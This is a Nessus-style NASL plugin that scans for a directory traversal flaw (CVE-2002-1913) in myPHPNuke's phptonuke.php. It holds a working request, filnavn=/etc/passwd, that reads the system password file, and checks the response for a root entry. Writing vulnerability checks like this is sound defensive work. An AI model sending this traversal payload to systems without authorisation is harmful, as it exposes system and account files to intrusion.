# This script was written by Michel Arboi <arboi@alussinan.org>
# It is released under the GNU Public Licence
#
# Status: it was *not* tested against a vulnerable host, and the 
# vulnerability is not confirlemed, as far as I know.
#
# Reference:
#
# From:	"Zero-X ScriptKiddy" <zero-x@linuxmail.org>
# To:	bugtraq@securityfocus.com
# Date:	Thu, 17 Oct 2002 05:50:10 +0800
# Subject: phptonuke allows Remote File Retrieving
#


if(description)
{
 script_id(11824);
 script_version ("$Revision: 1.9 $");

 script_cve_id("CVE-2002-1913");
 script_bugtraq_id(5982);

 name["english"] = "myPHPNuke phptonuke.php Directory Traversal";

 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote web server contains a PHP script that allows for reading of
arbitrary files. 

Description :

The version of myPHPNuke installed on the remote host allows anyone to
read arbitrary files by passing the full filename to the 'filnavn'
argument of the 'phptonuke.php' script. 

See also : 

http://marc.theaimsgroup.com/?l=bugtraq&m=103480589031537&w=2

Solution : 

Upgrade to the latest version.

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:N)";

 script_description(english:desc["english"]);
 summary["english"] = "Reads file through phptonuke.php";
 script_summary(english:summary["english"]);
 script_category(ACT_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi",
		francais:"Ce script est Copyright (C) 2003 Michel Arboi");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
		  
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port)) exit(0);
if(! can_host_php(port:port) ) exit(0);


function check(loc)
{
 local_var	req, r;
 req = http_get(item:string(loc, "/phptonuke.php?filnavn=/etc/passwd"),
		port:port);
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if (isnull(r)) exit(0);
 if(r =~ "root:.*:0:[01]:.*")
 {
  security_note(port);
  exit(0);
 }
}




foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}
